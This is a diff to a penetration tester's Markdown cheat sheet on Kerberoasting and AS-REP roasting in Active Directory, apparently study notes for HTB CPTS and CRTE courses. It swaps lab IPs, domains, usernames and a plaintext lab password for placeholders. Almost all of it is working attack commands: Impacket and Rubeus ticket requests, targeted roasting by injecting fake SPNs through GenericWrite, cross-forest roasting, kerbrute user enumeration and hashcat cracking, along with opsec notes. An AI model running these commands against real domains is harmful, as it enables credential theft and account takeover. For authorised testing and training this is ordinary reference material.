@@ -1,6 +1,6 @@
 # Kerberoasting & ASREPRoasting
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ## Kerberoasting — Request TGS Tickets for Offline Hash Cracking
 
@@ -14,16 +14,16 @@
 - **Payload/Method:**
   ```bash
   # List SPNs only
-  GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/username
+  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/username
 
   # Request all TGS tickets
-  GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/username -request
+  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/username -request
 
   # Target specific user
-  GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/username -request-user sqldev -outputfile sqldev_tgs
+  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/username -request-user sqldev -outputfile sqldev_tgs
 
   # Cross-forest kerberoasting
-  GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+  GetUserSPNs.py -request -target-domain TRUSTED.DOMAIN.LOCAL DOMAIN.LOCAL/<USER>
 
   # Crack
   hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
@@ -51,7 +51,7 @@
   Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 
   # Cross-forest
-  .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+  .\Rubeus.exe kerberoast /domain:TRUSTED.DOMAIN.LOCAL /user:mssqlsvc /nowrap
   ```
 
 ### Kerberoasting from Windows (PowerView) [added: 2026-04]
@@ -105,13 +105,13 @@
 - **Payload/Method:**
   ```powershell
   # Set fake SPN
-  Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+  Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 
   # Request and crack the ticket
-  .\Rubeus.exe kerberoast /user:adunn /nowrap
+  .\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap
 
   # Clean up after PoC
-  Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose
+  Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
   ```
 
 ### Targeted Kerberoasting via GenericWrite + Alternate Cred Object (CRTE / HTB CPTS) [added: 2026-04]
@@ -120,16 +120,16 @@
 - **Prereq:** GenericWrite on target user via controlled principal; valid credentials for the controlling principal
 - **Yields:** TGS hash of target user for offline cracking via SPN injection
 - **Opsec:** Med
-- **Context:** `jflemming` (via group GenericWrite) has `GenericWrite` over `ksalinas`. Use credential object to set SPN and Kerberoast — avoids password reset which is more visible.
+- **Context:** A user with GenericWrite over a target account can inject an SPN and Kerberoast — avoids password reset which is more visible.
 - **Payload/Method:**
 ```powershell
-$SecPassword = ConvertTo-SecureString '$$Bond@007$$' -AsPlainText -Force
-$Credjflemming = New-Object System.Management.Automation.PSCredential('TRILOCOR\jflemming', $SecPassword)
-Set-DomainObject -Credential $Credjflemming -Identity ksalinas -SET @{serviceprincipalname='goodboy/TOTALLYLEGIT'} -Verbose
+$SecPassword = ConvertTo-SecureString '<CONTROLLING_USER_PASS>' -AsPlainText -Force
+$CredCtrl = New-Object System.Management.Automation.PSCredential('DOMAIN\<CONTROLLING_USER>', $SecPassword)
+Set-DomainObject -Credential $CredCtrl -Identity <TARGET_USER> -SET @{serviceprincipalname='fake/SPN'} -Verbose
 
 # Kerberoast from Linux (proxychains for internal target)
-proxychains impacket-GetUserSPNs trilocor.local/jflemming:'$$Bond@007$$' -dc-ip 172.16.139.3 -request-user ksalinas
-hashcat -m 13100 ksalinas.txt /usr/share/wordlists/rockyou.txt
+proxychains impacket-GetUserSPNs domain.local/<CONTROLLING_USER>:'<CONTROLLING_USER_PASS>' -dc-ip <DC_IP> -request-user <TARGET_USER>
+hashcat -m 13100 <TARGET_USER>.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### Cross-Domain Kerberoasting via Forest Trust (HTB CPTS) [added: 2026-04]
@@ -192,7 +192,7 @@ hashcat -m 13100 svc_target.hash /usr/share/wordlists/rockyou.txt
   $HOME/Pentester/ptTools/static_binaries/kerbrute/kerbrute_linux_amd64 userenum -d <DOMAIN> --dc <DC_IP> <WORDLIST>
 
   # With creds: use GetNPUsers
-  GetNPUsers.py DOMAIN.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile users.txt -format hashcat
+  GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -format hashcat
   hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
   ```
 
